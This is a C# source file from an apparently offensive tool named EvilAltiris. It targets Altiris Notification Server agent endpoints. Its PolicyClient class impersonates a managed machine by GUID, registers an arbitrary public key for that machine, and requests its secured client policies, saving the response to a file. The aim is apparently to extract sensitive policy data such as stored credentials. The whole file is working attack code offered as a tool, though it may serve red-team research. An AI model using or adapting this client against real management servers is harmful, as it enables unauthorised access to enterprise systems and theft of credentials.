using EvilAltiris.Lib.HTTP;
using EvilAltiris.Lib;
using System;
using System.IO;
using System.Text;

namespace EvilAltiris.Lib.Agent
{
    public class PolicyClient : BaseHttpClient
    {
        public PolicyClient(string baseUrl) : base(baseUrl) { }

        public bool GetClientPolicies(string machineGuid, string typeGuid, string outfile = "")
        {
            string endpoint = "/altiris/NS/Agent/GetClientPolicies.aspx";
            string xmlContent = $"<request configVersion=\"2\" securedPolicy=\"1\">" +
                                $"<resources>" +
                                $"<resource required=\"true\" host=\"true\" guid=\"{machineGuid}\" typeGuid=\"{typeGuid}\">" +
                                $"</resource>" +
                                $"</resources>" +
                                $"</request>";

            string response = SendRequest(endpoint, "POST", "application/xml", xmlContent, machineGuid);

            return !HandleResponse(response, outfile);

        }

        public bool SetAgentPublicKey(string machineGuid, string publicKey)
        {
            string endpoint = "/altiris/NS/Agent/CreateResource.aspx";
            string xmlContent = $"<resource guid=\"{machineGuid}\" name=\"\" policyKey=\"{publicKey}\">" +
                                $"<regRequest guid=\"{machineGuid}\" state=\"new\"/>" +
                                $"</resource>";

            string response = SendRequest(endpoint, "POST", "application/xml", xmlContent, machineGuid);

            return !HandleResponse(response);
        }

        private bool HandleResponse(string response, string outfile = "")
        {
            if (response.Contains("error"))
            {
                Console.WriteLine($"[!] Received error response for request:\n{response}");
                return true;
            }
            else
            {
                Console.WriteLine("[+] Response received for request:");

                if (!string.IsNullOrEmpty(outfile))
                {
                    DataHandler.WriteBase64ToFile(response, outfile);
                }
                else
                {
                    Console.WriteLine($"[+] Response Content:\n{response}");
                }
                return false;
            }
        }
    }
}
